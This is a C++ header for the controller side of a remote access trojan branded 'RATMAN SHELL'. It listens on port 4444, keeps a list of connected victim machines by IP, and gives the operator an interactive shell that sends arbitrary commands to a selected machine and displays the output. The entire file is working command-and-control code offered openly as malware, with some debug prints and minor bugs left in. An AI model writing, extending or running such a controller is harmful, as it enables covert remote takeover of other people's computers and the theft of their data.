#pragma once
#ifndef SERVER_H
#define SERVER_H
#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <thread>
#include <winsock2.h>
#include <string>
#include <vector>
#include <mutex>
#include <atomic>
#include <condition_variable>
#include <queue>
#define PORT 4444                             // Global defintion of listening port for Server
#define BUFFER_SIZE 12900                      // Global definition of buffer size for Server
#undef max                                    // GLobal definition of max for Server
void mainMenu();                              // Global definition of mainMenu for Server
void clientSubMenu(int clientNumber);
bool clientsubmenu;

// Client info for tracking threads
struct ClientInfo {
    SOCKET socket;
    sockaddr_in address;
    std::string ip;
};  
// Console color for Server
void setConsoleColor(WORD color) {
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
    SetConsoleTextAttribute(hConsole, color);
}
// ASCII-ART for option one
void displayRATBanner() {
    setConsoleColor(FOREGROUND_RED);
    std::cout << R"(
  __________    _____ ___________ _____      _____    _______     _________  ___ ___ ___________.____     .____     
  \______   \  /  _  \\__    ___//     \    /  _  \   \      \   /   _____/ /   |   \\_   _____/|    |    |    |    
   |       _/ /  /_\  \ |    |  /  \ /  \  /  /_\  \  /   |   \  \_____  \ /    ~    \|    __)_ |    |    |    |    
   |    |   \/    |    \|    | /    Y    \/    |    \/    |    \ /        \\    Y    /|        \|    |___ |    |___ 
   |____|_  /\____|__  /|____| \____|__  /\____|__  /\____|__  //_______  / \___|_  //_______  /|_______ \|_______ \
          \/         \/                \/         \/         \/         \/        \/         \/         \/        \/ 
    )" << std::endl;
    setConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
}
// ASCII-ART for interpreter
void printPrompt() {
    setConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cout << "\nRATMANSHELL$> ";
    std::cout.flush();
}


// Buffer for receiving from Client in ratmanShell function
void receiveFromClient(SOCKET clientSocket, std::atomic<bool>& running) {
    char buffer[BUFFER_SIZE];
    while (running.load()) {
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        if (bytesReceived <= 0) {
            break; // Exit if no data is received or connection is closed
        }

        buffer[bytesReceived] = '\0'; // Null-terminate the received string
        std::cout << buffer << std::endl;
        
        // Flush output immediately to avoid delays in displaying received data
        std::cout.flush(); //<--- addedd
    }
}



/*
// Function to receive data from the client
void receiveFromClient(SOCKET clientSocket, std::atomic<bool>& running, std::queue<std::string>& outputQueue, 
    std::mutex& queueMutex, std::condition_variable& cv) {
char buffer[BUFFER_SIZE];

while (running.load()) {
    int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived <= 0) {
        // Handle errors or disconnection
        std::cout << "Error receiving data or client disconnected.\n";
        break;  // Exit the loop if receiving fails or client disconnects
}
buffer[bytesReceived] = '\0'; // Null-terminate the received data

// Add the received data to the queue
{
std::lock_guard<std::mutex> lock(queueMutex);
outputQueue.push(std::string(buffer));  // Push received data to the queue
}

// Notify the main thread that new data is available
cv.notify_one();
}

}
*/

void clearMenuConsole() {
    std::cout << std::flush;
    system("cls");
    std::cout << std::endl;
}

void clearConsole() {
    std::cout << std::flush;
    system("cls");
    displayRATBanner();
    std::cout << std::endl;
    
}

// General Command handling for the ratmanShell function
bool handleClientInput(SOCKET clientSocket, std::string* input) {
    while (true) {
        std::getline(std::cin, *input);

        if (*input == "exit") {
            send(clientSocket, input->c_str(), input->size(), 0);
            return false;
        }

        else if (*input == "cls") {
            clearConsole();
        }

        else if (*input == "back") {
            return false;
        }
        else {
            send(clientSocket, input->c_str(), input->size(), 0);
        }
        printPrompt();
    }
}

// Option one remote shell under the submenu for Client/s
void ratmanShell(ClientInfo& client) {
    displayRATBanner();
    bool continueShell = true;
    std::atomic<bool> receiveThreadRunning(true); // Flag to control the receiving thread
    std::thread receiveThread([&]() {
        receiveFromClient(client.socket, receiveThreadRunning);
    });
    receiveThread.detach(); // Detach the thread

    // FLUSH BUFFER / CLEAR OUTPUT BEFORE ENTERING SHELL
    
    std::cout.flush();  // Flush any buffered output to clear any remaining old data
   

    while (continueShell) {
        std::cout << "Entered continueshell loop Line 110\n";
        printPrompt();
        std::string input;
        std::getline(std::cin, input);

        if (input == "back") {
            std::cout << "Exited continueshell loop Line 115.\n";
            send(client.socket, "back", 4, 0); // Notify client to exit shell
            receiveThreadRunning.store(false); // Stop the receive thread
            continueShell = false;
            break;  // Exit shell loop and stop receiving thread
        }
        else if (input == "exit") {
            std::cout << "Exited continueshell loop Line 172.\n";
            send(client.socket, "exit", 4, 0); // Notify client to exit shell    //close socket here 
            receiveThreadRunning.store(false); // Stop the receive thread  
            continueShell = false;
            clientsubmenu = false;
            break;  // Exit shell loop and stop receiving thread
        }
        else if (input == "cls") {
            clearConsole();
        }
        else {
            send(client.socket, input.c_str(), input.size(), 0); // Send command to client

        }
    }
}

std::vector<ClientInfo> clients;               // List of connected clients
std::mutex clientMutex;                        // Mutex for thread-safe access to clients
std::condition_variable clientConnectedCV;     // Condition variable to notify mainMenu
bool clientConnected = false;                  // Flag to indicate if a client has connected
// Server side accepting and tracking of Client/s
void acceptClients(SOCKET serverSocket) {
    while (true) {
        sockaddr_in clientAddr;
        int clientAddrSize = sizeof(clientAddr);
        SOCKET clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrSize);

        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed." << std::endl;
            continue;
        }

        std::lock_guard<std::mutex> lock(clientMutex);

        // Get client IP address as a string
        std::string clientIp = inet_ntoa(clientAddr.sin_addr);

        // Remove all previous instances of the client IP
        auto it = std::remove_if(clients.begin(), clients.end(),
            [&clientIp](const ClientInfo& client) {
                return client.ip == clientIp;
            });
        if (it != clients.end()) {
            std::cout << "Duplicate client IP detected. Removing previous instances of IP: " << clientIp << std::endl;
            clients.erase(it, clients.end());
        }

        // Add the new client connection
        ClientInfo newClient;
        newClient.socket = clientSocket;
        newClient.address = clientAddr;
        newClient.ip = clientIp;
        clients.push_back(newClient);

        std::cout << "Client connected: " << newClient.ip << std::endl;
        printPrompt();

        // Notify main menu that a client has connected
        clientConnected = true;
        clientConnectedCV.notify_all();
    }
}

// Fetch the client info by client number (1-based index)
ClientInfo getClientInfo(int clientNumber) {
    std::lock_guard<std::mutex> lock(clientMutex); // Ensure thread-safe access to clients
    if (clientNumber < 1 || clientNumber > clients.size()) {
        std::cout << "Invalid client number!" << std::endl;
        return ClientInfo(); // Return a default-initialized ClientInfo if invalid number is given
    }
    return clients[clientNumber - 1];  // Return the ClientInfo object for the given client number
}

// client sub menu
void clientSubMenu(int clientNumber) {
    int subChoice;
    std::string input;
    clientsubmenu = true;
    while (clientsubmenu) {
        std::cout << "\n1. RATMAN Shell\n";
        std::cout << "2. Back to Main Menu\n";
        printPrompt();  // Show prompt

        std::getline(std::cin, input);  // Use getline to capture "cls" or numbers as strings

        if (input == "1") {
            send(clients[clientNumber].socket, "1", 4, 0);
            ratmanShell(clients[clientNumber]);
            
        }
        else if (input == "2") {
            std::cout << "Returning to main menu.\n";
            clientsubmenu = false;
            break;  // Exit to main menu
        }
        else if (input == "exit") {
            send(clients[clientNumber].socket, "exit", 4, 0);
            //close socket here 
            clientsubmenu = false;
            break;
        }
        else if (input == "cls") {
            // Clear the console screen
#ifdef _WIN32
            system("cls");  // For Windows
#else
            system("clear"); // For Unix-based systems
#endif
        }
        else {
            std::cout << "Invalid option or input try again pal\n";
        }
    }
}


// Server Main menu
void mainMenu() {
    std::string input;
    while (true) {
        std::cout << "\nMain Menu:\n";
        std::cout << "1. List Clients\n";
        std::cout << "2. Select Client\n";
        std::cout << "3. Exit\n";
        printPrompt();
        std::getline(std::cin, input);
        if (input == "cls") {
            clearMenuConsole();
            continue; // Skip the rest of the loop to re-display menu
        }
        int choice;
        try {
            choice = std::stoi(input); // Convert input to an integer
        }
        catch (...) {
            std::cout << "Invalid option.\n";
            continue;
        }
        switch (choice) {
        case 1:
            std::cout << "\nConnected Clients:\n";
            if (clients.empty()) {
                std::cout << "No clients connected.\n";
            }
            else {
                for (size_t i = 0; i < clients.size(); ++i) {
                    std::cout << (i + 1) << ". " << clients[i].ip << std::endl;
                }
            }
            break;
        case 2:
            std::cout << "Enter client number: ";
            int clientNumber;
            std::cin >> clientNumber;
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            if (clientNumber >= 1 && clientNumber <= clients.size()) {
                clientSubMenu(clientNumber - 1); // synchronous operation entered for said client from vector 
            }
            else {
                std::cout << "Invalid client number.\n";
            }
            break;
        case 3:
            std::cout << "Exiting.\n";
            return; // Exit program
        default:
            std::cout << "Invalid option.\n";
        }
    }
}

#endif //SERVER_H
